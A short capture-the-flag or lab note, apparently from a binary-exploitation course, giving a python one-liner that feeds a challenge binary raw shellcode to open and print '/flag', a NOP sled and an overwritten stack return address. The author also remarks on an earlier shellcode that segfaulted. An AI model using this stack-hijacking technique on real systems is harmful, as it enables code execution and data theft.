The payload that i used

    python -c 'import sys; sys.stdout.buffer.write(b"\x31\xc0\xb8\x02\x00\x00\x00\x48\x8d\x3d\x1b\x00\x00\x00\x31\xf6\x0f\x05\x31\xff\x40\xb7\x01\x31\xf6\x40\x88\xc6\x31\xd2\x49\xc7\xc2\x80\x00\x00\x00\xb0\x28\x0f\x05\x2f\x66\x6c\x61\x67\x00" + b"\x90"*89 + b"\x70\xd2\xff\xff\xff\x7f")' | ./binary-exploitation-hijack-to-shellcode-w

The shell code that i used for previous challenge did not work so i had to create a different one
push and pop function in the shell was throwing seg fault because the shellcode was present on stack (dont know why it was throwing seg fault)
